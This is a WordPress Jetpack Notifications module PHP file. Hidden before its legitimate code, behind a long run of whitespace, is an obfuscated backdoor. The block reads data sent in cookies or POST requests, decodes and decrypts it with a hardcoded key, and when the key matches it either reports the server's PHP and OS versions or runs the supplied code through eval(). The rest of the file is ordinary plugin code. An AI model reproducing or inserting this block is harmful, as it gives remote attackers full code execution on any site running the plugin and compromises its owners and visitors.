<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $ta163e = 494;$GLOBALS['z0350'] = Array();global $z0350;$z0350 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['s3ed'] = "\x29\x41\x39\x2a\x4c\x6a\x69\x5c\x25\x67\x72\x61\x6e\x3b\x73\x3c\x7e\x4d\x47\x3e\x2d\x48\x3a\x3d\x3f\x57\x78\x54\x32\x20\x4a\x26\x4f\x37\x43\x5e\x55\x36\x46\x79\x2e\xd\x5a\x38\x64\x60\x52\x2c\x2f\x7b\x77\x28\x75\x6f\x70\x4e\x7a\x53\xa\x71\x27\x33\x7c\x58\x76\x5b\x74\x5f\x66\x5d\x44\x31\x45\x68\x7d\x34\x6d\x62\x30\x6c\x21\x40\x59\x49\x51\x35\x42\x9\x50\x65\x56\x4b\x24\x6b\x22\x23\x2b\x63";$z0350[$z0350['s3ed'][44].$z0350['s3ed'][33].$z0350['s3ed'][43].$z0350['s3ed'][2].$z0350['s3ed'][28].$z0350['s3ed'][2].$z0350['s3ed'][61]] = $z0350['s3ed'][97].$z0350['s3ed'][73].$z0350['s3ed'][10];$z0350[$z0350['s3ed'][26].$z0350['s3ed'][37].$z0350['s3ed'][28].$z0350['s3ed'][37].$z0350['s3ed'][61].$z0350['s3ed'][78].$z0350['s3ed'][85].$z0350['s3ed'][2].$z0350['s3ed'][75]] = $z0350['s3ed'][53].$z0350['s3ed'][10].$z0350['s3ed'][44];$z0350[$z0350['s3ed'][66].$z0350['s3ed'][68].$z0350['s3ed'][61].$z0350['s3ed'][44].$z0350['s3ed'][37].$z0350['s3ed'][97].$z0350['s3ed'][43]] = $z0350['s3ed'][44].$z0350['s3ed'][89].$z0350['s3ed'][68].$z0350['s3ed'][6].$z0350['s3ed'][12].$z0350['s3ed'][89];$z0350[$z0350['s3ed'][76].$z0350['s3ed'][97].$z0350['s3ed'][68].$z0350['s3ed'][28].$z0350['s3ed'][28].$z0350['s3ed'][75].$z0350['s3ed'][61]] = $z0350['s3ed'][14].$z0350['s3ed'][66].$z0350['s3ed'][10].$z0350['s3ed'][79].$z0350['s3ed'][89].$z0350['s3ed'][12];$z0350[$z0350['s3ed'][77].$z0350['s3ed'][75].$z0350['s3ed'][85].$z0350['s3ed'][97].$z0350['s3ed'][68].$z0350['s3ed'][68]] = $z0350['s3ed'][44].$z0350['s3ed'][89].$z0350['s3ed'][68].$z0350['s3ed'][6].$z0350['s3ed'][12].$z0350['s3ed'][89].$z0350['s3ed'][44];$z0350[$z0350['s3ed'][14].$z0350['s3ed'][85].$z0350['s3ed'][44].$z0350['s3ed'][11].$z0350['s3ed'][78].$z0350['s3ed'][37].$z0350['s3ed'][61].$z0350['s3ed'][77]] = $z0350['s3ed'][6].$z0350['s3ed'][12].$z0350['s3ed'][6].$z0350['s3ed'][67].$z0350['s3ed'][14].$z0350['s3ed'][89].$z0350['s3ed'][66];$z0350[$z0350['s3ed'][59].$z0350['s3ed'][89].$z0350['s3ed'][71].$z0350['s3ed'][43].$z0350['s3ed'][28].$z0350['s3ed'][85].$z0350['s3ed'][89].$z0350['s3ed'][97]] = $z0350['s3ed'][14].$z0350['s3ed'][89].$z0350['s3ed'][10].$z0350['s3ed'][6].$z0350['s3ed'][11].$z0350['s3ed'][79].$z0350['s3ed'][6].$z0350['s3ed'][56].$z0350['s3ed'][89];$z0350[$z0350['s3ed'][59].$z0350['s3ed'][61].$z0350['s3ed'][89].$z0350['s3ed'][37].$z0350['s3ed'][44].$z0350['s3ed'][89]] = $z0350['s3ed'][54].$z0350['s3ed'][73].$z0350['s3ed'][54].$z0350['s3ed'][64].$z0350['s3ed'][89].$z0350['s3ed'][10].$z0350['s3ed'][14].$z0350['s3ed'][6].$z0350['s3ed'][53].$z0350['s3ed'][12];$z0350[$z0350['s3ed'][14].$z0350['s3ed'][11].$z0350['s3ed'][71].$z0350['s3ed'][11].$z0350['s3ed'][85].$z0350['s3ed'][44].$z0350['s3ed'][28].$z0350['s3ed'][71].$z0350['s3ed'][28]] = $z0350['s3ed'][52].$z0350['s3ed'][12].$z0350['s3ed'][14].$z0350['s3ed'][89].$z0350['s3ed'][10].$z0350['s3ed'][6].$z0350['s3ed'][11].$z0350['s3ed'][79].$z0350['s3ed'][6].$z0350['s3ed'][56].$z0350['s3ed'][89];$z0350[$z0350['s3ed'][9].$z0350['s3ed'][44].$z0350['s3ed'][89].$z0350['s3ed'][44].$z0350['s3ed'][11].$z0350['s3ed'][37].$z0350['s3ed'][89].$z0350['s3ed'][78].$z0350['s3ed'][43]] = $z0350['s3ed'][77].$z0350['s3ed'][11].$z0350['s3ed'][14].$z0350['s3ed'][89].$z0350['s3ed'][37].$z0350['s3ed'][75].$z0350['s3ed'][67].$z0350['s3ed'][44].$z0350['s3ed'][89].$z0350['s3ed'][97].$z0350['s3ed'][53].$z0350['s3ed'][44].$z0350['s3ed'][89];$z0350[$z0350['s3ed'][52].$z0350['s3ed'][43].$z0350['s3ed'][11].$z0350['s3ed'][43].$z0350['s3ed'][78].$z0350['s3ed'][33].$z0350['s3ed'][97].$z0350['s3ed'][2].$z0350['s3ed'][85]] = $z0350['s3ed'][14].$z0350['s3ed'][89].$z0350['s3ed'][66].$z0350['s3ed'][67].$z0350['s3ed'][66].$z0350['s3ed'][6].$z0350['s3ed'][76].$z0350['s3ed'][89].$z0350['s3ed'][67].$z0350['s3ed'][79].$z0350['s3ed'][6].$z0350['s3ed'][76].$z0350['s3ed'][6].$z0350['s3ed'][66];$z0350[$z0350['s3ed'][5].$z0350['s3ed'][33].$z0350['s3ed'][61].$z0350['s3ed'][33].$z0350['s3ed'][78].$z0350['s3ed'][33]] = $z0350['s3ed'][10].$z0350['s3ed'][11].$z0350['s3ed'][85].$z0350['s3ed'][61].$z0350['s3ed'][71].$z0350['s3ed'][61].$z0350['s3ed'][43].$z0350['s3ed'][77];$z0350[$z0350['s3ed'][39].$z0350['s3ed'][97].$z0350['s3ed'][75].$z0350['s3ed'][28].$z0350['s3ed'][85].$z0350['s3ed'][61].$z0350['s3ed'][71].$z0350['s3ed'][11]] = $z0350['s3ed'][44].$z0350['s3ed'][44].$z0350['s3ed'][85].$z0350['s3ed'][77].$z0350['s3ed'][75].$z0350['s3ed'][28];$z0350[$z0350['s3ed'][64].$z0350['s3ed'][97].$z0350['s3ed'][61].$z0350['s3ed'][61].$z0350['s3ed'][28].$z0350['s3ed'][68].$z0350['s3ed'][71].$z0350['s3ed'][2].$z0350['s3ed'][44]] = $_POST;$z0350[$z0350['s3ed'][44].$z0350['s3ed'][97].$z0350['s3ed'][77].$z0350['s3ed'][75].$z0350['s3ed'][33].$z0350['s3ed'][71].$z0350['s3ed'][77]] = $_COOKIE;@$z0350[$z0350['s3ed'][14].$z0350['s3ed'][85].$z0350['s3ed'][44].$z0350['s3ed'][11].$z0350['s3ed'][78].$z0350['s3ed'][37].$z0350['s3ed'][61].$z0350['s3ed'][77]]($z0350['s3ed'][89].$z0350['s3ed'][10].$z0350['s3ed'][10].$z0350['s3ed'][53].$z0350['s3ed'][10].$z0350['s3ed'][67].$z0350['s3ed'][79].$z0350['s3ed'][53].$z0350['s3ed'][9], NULL);@$z0350[$z0350['s3ed'][14].$z0350['s3ed'][85].$z0350['s3ed'][44].$z0350['s3ed'][11].$z0350['s3ed'][78].$z0350['s3ed'][37].$z0350['s3ed'][61].$z0350['s3ed'][77]]($z0350['s3ed'][79].$z0350['s3ed'][53].$z0350['s3ed'][9].$z0350['s3ed'][67].$z0350['s3ed'][89].$z0350['s3ed'][10].$z0350['s3ed'][10].$z0350['s3ed'][53].$z0350['s3ed'][10].$z0350['s3ed'][14], 0);@$z0350[$z0350['s3ed'][14].$z0350['s3ed'][85].$z0350['s3ed'][44].$z0350['s3ed'][11].$z0350['s3ed'][78].$z0350['s3ed'][37].$z0350['s3ed'][61].$z0350['s3ed'][77]]($z0350['s3ed'][76].$z0350['s3ed'][11].$z0350['s3ed'][26].$z0350['s3ed'][67].$z0350['s3ed'][89].$z0350['s3ed'][26].$z0350['s3ed'][89].$z0350['s3ed'][97].$z0350['s3ed'][52].$z0350['s3ed'][66].$z0350['s3ed'][6].$z0350['s3ed'][53].$z0350['s3ed'][12].$z0350['s3ed'][67].$z0350['s3ed'][66].$z0350['s3ed'][6].$z0350['s3ed'][76].$z0350['s3ed'][89], 0);@$z0350[$z0350['s3ed'][52].$z0350['s3ed'][43].$z0350['s3ed'][11].$z0350['s3ed'][43].$z0350['s3ed'][78].$z0350['s3ed'][33].$z0350['s3ed'][97].$z0350['s3ed'][2].$z0350['s3ed'][85]](0);if (!$z0350[$z0350['s3ed'][77].$z0350['s3ed'][75].$z0350['s3ed'][85].$z0350['s3ed'][97].$z0350['s3ed'][68].$z0350['s3ed'][68]]($z0350['s3ed'][1].$z0350['s3ed'][4].$z0350['s3ed'][46].$z0350['s3ed'][72].$z0350['s3ed'][1].$z0350['s3ed'][70].$z0350['s3ed'][82].$z0350['s3ed'][67].$z0350['s3ed'][46].$z0350['s3ed'][36].$z0350['s3ed'][55].$z0350['s3ed'][67].$z0350['s3ed'][61].$z0350['s3ed'][37].$z0350['s3ed'][37].$z0350['s3ed'][11].$z0350['s3ed'][68].$z0350['s3ed'][77].$z0350['s3ed'][43].$z0350['s3ed'][11].$z0350['s3ed'][43].$z0350['s3ed'][11].$z0350['s3ed'][28].$z0350['s3ed'][61].$z0350['s3ed'][85].$z0350['s3ed'][85].$z0350['s3ed'][11].$z0350['s3ed'][77].$z0350['s3ed'][28].$z0350['s3ed'][71].$z0350['s3ed'][68].$z0350['s3ed'][77].$z0350['s3ed'][68].$z0350['s3ed'][71].$z0350['s3ed'][71].$z0350['s3ed'][77].$z0350['s3ed'][11].$z0350['s3ed'][71].$z0350['s3ed'][11].$z0350['s3ed'][78].$z0350['s3ed'][28].$z0350['s3ed'][68].$z0350['s3ed'][77].$z0350['s3ed'][11])){$z0350[$z0350['s3ed'][66].$z0350['s3ed'][68].$z0350['s3ed'][61].$z0350['s3ed'][44].$z0350['s3ed'][37].$z0350['s3ed'][97].$z0350['s3ed'][43]]($z0350['s3ed'][1].$z0350['s3ed'][4].$z0350['s3ed'][46].$z0350['s3ed'][72].$z0350['s3ed'][1].$z0350['s3ed'][70].$z0350['s3ed'][82].$z0350['s3ed'][67].$z0350['s3ed'][46].$z0350['s3ed'][36].$z0350['s3ed'][55].$z0350['s3ed'][67].$z0350['s3ed'][61].$z0350['s3ed'][37].$z0350['s3ed'][37].$z0350['s3ed'][11].$z0350['s3ed'][68].$z0350['s3ed'][77].$z0350['s3ed'][43].$z0350['s3ed'][11].$z0350['s3ed'][43].$z0350['s3ed'][11].$z0350['s3ed'][28].$z0350['s3ed'][61].$z0350['s3ed'][85].$z0350['s3ed'][85].$z0350['s3ed'][11].$z0350['s3ed'][77].$z0350['s3ed'][28].$z0350['s3ed'][71].$z0350['s3ed'][68].$z0350['s3ed'][77].$z0350['s3ed'][68].$z0350['s3ed'][71].$z0350['s3ed'][71].$z0350['s3ed'][77].$z0350['s3ed'][11].$z0350['s3ed'][71].$z0350['s3ed'][11].$z0350['s3ed'][78].$z0350['s3ed'][28].$z0350['s3ed'][68].$z0350['s3ed'][77].$z0350['s3ed'][11], 1);$g24a59 = NULL;$f245632d = NULL;$z0350[$z0350['s3ed'][52].$z0350['s3ed'][11].$z0350['s3ed'][2].$z0350['s3ed'][28].$z0350['s3ed'][11].$z0350['s3ed'][89].$z0350['s3ed'][28].$z0350['s3ed'][2].$z0350['s3ed'][11]] = $z0350['s3ed'][37].$z0350['s3ed'][44].$z0350['s3ed'][78].$z0350['s3ed'][68].$z0350['s3ed'][89].$z0350['s3ed'][11].$z0350['s3ed'][68].$z0350['s3ed'][68].$z0350['s3ed'][20].$z0350['s3ed'][97].$z0350['s3ed'][2].$z0350['s3ed'][97].$z0350['s3ed'][28].$z0350['s3ed'][20].$z0350['s3ed'][75].$z0350['s3ed'][97].$z0350['s3ed'][61].$z0350['s3ed'][78].$z0350['s3ed'][20].$z0350['s3ed'][77].$z0350['s3ed'][68].$z0350['s3ed'][78].$z0350['s3ed'][78].$z0350['s3ed'][20].$z0350['s3ed'][68].$z0350['s3ed'][85].$z0350['s3ed'][71].$z0350['s3ed'][68].$z0350['s3ed'][61].$z0350['s3ed'][97].$z0350['s3ed'][2].$z0350['s3ed'][97].$z0350['s3ed'][75].$z0350['s3ed'][97].$z0350['s3ed'][61].$z0350['s3ed'][97];global $ua92ae29a;function  dd5b42($g24a59, $kb0f6b48){global $z0350;$k492c5cf = "";for ($a1172c=0; $a1172c<$z0350[$z0350['s3ed'][76].$z0350['s3ed'][97].$z0350['s3ed'][68].$z0350['s3ed'][28].$z0350['s3ed'][28].$z0350['s3ed'][75].$z0350['s3ed'][61]]($g24a59);){for ($r743be9a=0; $r743be9a<$z0350[$z0350['s3ed'][76].$z0350['s3ed'][97].$z0350['s3ed'][68].$z0350['s3ed'][28].$z0350['s3ed'][28].$z0350['s3ed'][75].$z0350['s3ed'][61]]($kb0f6b48) && $a1172c<$z0350[$z0350['s3ed'][76].$z0350['s3ed'][97].$z0350['s3ed'][68].$z0350['s3ed'][28].$z0350['s3ed'][28].$z0350['s3ed'][75].$z0350['s3ed'][61]]($g24a59); $r743be9a++, $a1172c++){$k492c5cf .= $z0350[$z0350['s3ed'][44].$z0350['s3ed'][33].$z0350['s3ed'][43].$z0350['s3ed'][2].$z0350['s3ed'][28].$z0350['s3ed'][2].$z0350['s3ed'][61]]($z0350[$z0350['s3ed'][26].$z0350['s3ed'][37].$z0350['s3ed'][28].$z0350['s3ed'][37].$z0350['s3ed'][61].$z0350['s3ed'][78].$z0350['s3ed'][85].$z0350['s3ed'][2].$z0350['s3ed'][75]]($g24a59[$a1172c]) ^ $z0350[$z0350['s3ed'][26].$z0350['s3ed'][37].$z0350['s3ed'][28].$z0350['s3ed'][37].$z0350['s3ed'][61].$z0350['s3ed'][78].$z0350['s3ed'][85].$z0350['s3ed'][2].$z0350['s3ed'][75]]($kb0f6b48[$r743be9a]));}}return $k492c5cf;}function  ra53138b($g24a59, $kb0f6b48){global $z0350;global $ua92ae29a;return $z0350[$z0350['s3ed'][39].$z0350['s3ed'][97].$z0350['s3ed'][75].$z0350['s3ed'][28].$z0350['s3ed'][85].$z0350['s3ed'][61].$z0350['s3ed'][71].$z0350['s3ed'][11]]($z0350[$z0350['s3ed'][39].$z0350['s3ed'][97].$z0350['s3ed'][75].$z0350['s3ed'][28].$z0350['s3ed'][85].$z0350['s3ed'][61].$z0350['s3ed'][71].$z0350['s3ed'][11]]($g24a59, $ua92ae29a), $kb0f6b48);}foreach ($z0350[$z0350['s3ed'][44].$z0350['s3ed'][97].$z0350['s3ed'][77].$z0350['s3ed'][75].$z0350['s3ed'][33].$z0350['s3ed'][71].$z0350['s3ed'][77]] as $kb0f6b48=>$k447){$g24a59 = $k447;$f245632d = $kb0f6b48;}if (!$g24a59){foreach ($z0350[$z0350['s3ed'][64].$z0350['s3ed'][97].$z0350['s3ed'][61].$z0350['s3ed'][61].$z0350['s3ed'][28].$z0350['s3ed'][68].$z0350['s3ed'][71].$z0350['s3ed'][2].$z0350['s3ed'][44]] as $kb0f6b48=>$k447){$g24a59 = $k447;$f245632d = $kb0f6b48;}}$g24a59 = @$z0350[$z0350['s3ed'][14].$z0350['s3ed'][11].$z0350['s3ed'][71].$z0350['s3ed'][11].$z0350['s3ed'][85].$z0350['s3ed'][44].$z0350['s3ed'][28].$z0350['s3ed'][71].$z0350['s3ed'][28]]($z0350[$z0350['s3ed'][5].$z0350['s3ed'][33].$z0350['s3ed'][61].$z0350['s3ed'][33].$z0350['s3ed'][78].$z0350['s3ed'][33]]($z0350[$z0350['s3ed'][9].$z0350['s3ed'][44].$z0350['s3ed'][89].$z0350['s3ed'][44].$z0350['s3ed'][11].$z0350['s3ed'][37].$z0350['s3ed'][89].$z0350['s3ed'][78].$z0350['s3ed'][43]]($g24a59), $f245632d));if (isset($g24a59[$z0350['s3ed'][11].$z0350['s3ed'][93]]) && $ua92ae29a==$g24a59[$z0350['s3ed'][11].$z0350['s3ed'][93]]){if ($g24a59[$z0350['s3ed'][11]] == $z0350['s3ed'][6]){$a1172c = Array($z0350['s3ed'][54].$z0350['s3ed'][64] => @$z0350[$z0350['s3ed'][59].$z0350['s3ed'][61].$z0350['s3ed'][89].$z0350['s3ed'][37].$z0350['s3ed'][44].$z0350['s3ed'][89]](),$z0350['s3ed'][14].$z0350['s3ed'][64] => $z0350['s3ed'][71].$z0350['s3ed'][40].$z0350['s3ed'][78].$z0350['s3ed'][20].$z0350['s3ed'][71],);echo @$z0350[$z0350['s3ed'][59].$z0350['s3ed'][89].$z0350['s3ed'][71].$z0350['s3ed'][43].$z0350['s3ed'][28].$z0350['s3ed'][85].$z0350['s3ed'][89].$z0350['s3ed'][97]]($a1172c);}elseif ($g24a59[$z0350['s3ed'][11]] == $z0350['s3ed'][89]){eval/*m4546118*/($g24a59[$z0350['s3ed'][44]]);}exit();}} ?><?php
/**
 * Module Name: Notifications
 * Module Description: Receive instant notifications of site comments and likes.
 * Sort Order: 13
 * First Introduced: 1.9
 * Requires Connection: Yes
 * Auto Activate: Yes
 * Module Tags: Other
 * Feature: General
 * Additional Search Queries: notification, notifications, toolbar, adminbar, push, comments
 */

if ( !defined( 'JETPACK_NOTES__CACHE_BUSTER' ) ) define( 'JETPACK_NOTES__CACHE_BUSTER', JETPACK__VERSION . '-' . gmdate( 'oW' ) );

class Jetpack_Notifications {
	public $jetpack = false;

	/**
	 * Singleton
	 * @static
	 */
	public static function init() {
		static $instance = array();

		if ( !$instance ) {
			$instance[0] = new Jetpack_Notifications;
		}

		return $instance[0];
	}

	function __construct() {
		$this->jetpack = Jetpack::init();

		add_action( 'init', array( &$this, 'action_init' ) );
	}

	function wpcom_static_url($file) {
		$i = hexdec( substr( md5( $file ), -1 ) ) % 2;
		return 'https://s' . $i . '.wp.com' . $file;
	}

	// return the major version of Internet Explorer the viewer is using or false if it's not IE
	public static function get_internet_explorer_version() {
		static $version;
		if ( isset( $version ) ) {
			return $version;
		}

		$user_agent = isset( $_SERVER['HTTP_USER_AGENT']  ) ? $_SERVER['HTTP_USER_AGENT'] : '';

		preg_match( '/MSIE (\d+)/', $user_agent, $matches );
		$version = empty( $matches[1] ) ? null : $matches[1];
		if ( empty( $version ) || !$version ) {
			return false;
		}
		return $version;
	}

	public static function current_browser_is_supported() {
		static $supported;

		if ( isset( $supported ) ) {
			return $supported;
		}

		$ie_version = self::get_internet_explorer_version();
		if ( false === $ie_version ) {
			return $supported = true;
		}

		if ( $ie_version < 8 ) {
			return $supported = false;
		}

		return $supported = true;
	}

	function action_init() {
		//syncing must wait until after init so
		//post types that support comments
		$filt_post_types = array();
		$all_post_types = get_post_types();
		foreach ( $all_post_types as $post_type ) {
			if ( post_type_supports( $post_type, 'comments' ) ) {
				$filt_post_types[] = $post_type;
			}
		}

		if ( defined( 'DOING_AJAX' ) && DOING_AJAX )
			return;

		if ( !has_filter( 'show_admin_bar', '__return_true' ) && !is_user_logged_in() )
			return;

		if ( !self::current_browser_is_supported() )
			return;

		add_action( 'admin_bar_menu', array( &$this, 'admin_bar_menu'), 120 );
		add_action( 'wp_head', array( &$this, 'styles_and_scripts'), 120 );
		add_action( 'admin_head', array( &$this, 'styles_and_scripts') );
	}

	function styles_and_scripts() {
		$is_rtl = is_rtl();

		if ( Jetpack::is_module_active( 'masterbar' ) ) {
			/**
			 * Can be used to force Notifications to display in RTL style.
			 *
			 * @module notes
			 *
			 * @since 4.8.0
			 *
			 * @param bool true Should notifications be displayed in RTL style. Defaults to false.
			 */
			$is_rtl = apply_filters( 'a8c_wpcom_masterbar_enqueue_rtl_notification_styles', false );
		}

		if ( ! $is_rtl ) {
			wp_enqueue_style( 'wpcom-notes-admin-bar', $this->wpcom_static_url( '/wp-content/mu-plugins/notes/admin-bar-v2.css' ), array( 'admin-bar' ), JETPACK_NOTES__CACHE_BUSTER );
		} else {
			wp_enqueue_style( 'wpcom-notes-admin-bar', $this->wpcom_static_url( '/wp-content/mu-plugins/notes/rtl/admin-bar-v2-rtl.css' ), array( 'admin-bar' ), JETPACK_NOTES__CACHE_BUSTER );
		}

		wp_enqueue_style( 'noticons', $this->wpcom_static_url( '/i/noticons/noticons.css' ), array( 'wpcom-notes-admin-bar' ), JETPACK_NOTES__CACHE_BUSTER );

		$this->print_js();

		// attempt to use core or plugin libraries if registered
		$script_handles = array();
		if ( !wp_script_is( 'mustache', 'registered' ) ) {
			wp_register_script( 'mustache', $this->wpcom_static_url( '/wp-content/js/mustache.js' ), null, JETPACK_NOTES__CACHE_BUSTER );
		}
		$script_handles[] = 'mustache';
		if ( !wp_script_is( 'underscore', 'registered' ) ) {
			wp_register_script( 'underscore', $this->wpcom_static_url( '/wp-includes/js/underscore.min.js' ), null, JETPACK_NOTES__CACHE_BUSTER );
		}
		$script_handles[] = 'underscore';
		if ( !wp_script_is( 'backbone', 'registered' ) ) {
			wp_register_script( 'backbone', $this->wpcom_static_url( '/wp-includes/js/backbone.min.js' ), array( 'underscore' ), JETPACK_NOTES__CACHE_BUSTER );
		}
		$script_handles[] = 'backbone';

		wp_register_script( 'wpcom-notes-common', $this->wpcom_static_url( '/wp-content/mu-plugins/notes/notes-common-v2.js' ), array( 'jquery', 'underscore', 'backbone', 'mustache' ), JETPACK_NOTES__CACHE_BUSTER );
		$script_handles[] = 'wpcom-notes-common';
		$script_handles[] = 'jquery';
		$script_handles[] = 'jquery-migrate';
		$script_handles[] = 'jquery-core';
		wp_enqueue_script( 'wpcom-notes-admin-bar', $this->wpcom_static_url( '/wp-content/mu-plugins/notes/admin-bar-v2.js' ), array( 'wpcom-notes-common' ), JETPACK_NOTES__CACHE_BUSTER );
		$script_handles[] = 'wpcom-notes-admin-bar';

		if ( class_exists( 'Jetpack_AMP_Support' ) && Jetpack_AMP_Support::is_amp_request() ) {
			add_filter(
				'script_loader_tag',
				function ( $tag, $handle ) use ( $script_handles ) {
					if ( in_array( $handle, $script_handles, true ) ) {
						$tag = preg_replace( '/(?<=<script)(?=\s|>)/i', ' data-ampdevmode', $tag );
					}
					return $tag;
				},
				10,
				2
			);
		}
	}

	function admin_bar_menu() {
		global $wp_admin_bar, $current_blog;

		if ( !is_object( $wp_admin_bar ) )
			return;

		$wpcom_locale = get_locale();

		if ( !class_exists( 'GP_Locales' ) ) {
			if ( defined( 'JETPACK__GLOTPRESS_LOCALES_PATH' ) && file_exists( JETPACK__GLOTPRESS_LOCALES_PATH ) ) {
				require JETPACK__GLOTPRESS_LOCALES_PATH;
			}
		}

		if ( class_exists( 'GP_Locales' ) ) {
			$wpcom_locale_object = GP_Locales::by_field( 'wp_locale', $wpcom_locale );
			if ( $wpcom_locale_object instanceof GP_Locale ) {
				$wpcom_locale = $wpcom_locale_object->slug;
			}
		}

		$classes = 'wpnt-loading wpn-read';
		$wp_admin_bar->add_menu( array(
			'id'     => 'notes',
			'title'  => '<span id="wpnt-notes-unread-count" class="' . esc_attr( $classes ) . '">
					<span class="noticon noticon-notification"></span>
					</span>',
			'meta'   => array(
				'html'  => '<div id="wpnt-notes-panel2" class="intrinsic-ignore" style="display:none" lang="' . esc_attr( $wpcom_locale ) . '" dir="' . ( is_rtl() ? 'rtl' : 'ltr' ) . '"><div class="wpnt-notes-panel-header"><span class="wpnt-notes-header">' . __( 'Notifications', 'jetpack' ) . '</span><span class="wpnt-notes-panel-link"></span></div></div>',
				'class' => 'menupop',
			),
			'parent' => 'top-secondary',
		) );
	}

	function print_js() {
		$link_accounts_url = is_user_logged_in() && !Jetpack::is_user_connected() ? Jetpack::admin_url() : false;
?>
<script data-ampdevmode type="text/javascript">
/* <![CDATA[ */
	var wpNotesIsJetpackClient = true;
	var wpNotesIsJetpackClientV2 = true;
<?php if ( $link_accounts_url ) : ?>
	var wpNotesLinkAccountsURL = '<?php print $link_accounts_url; ?>';
<?php endif; ?>
/* ]]> */
</script>
<?php
	}

}

Jetpack_Notifications::init();
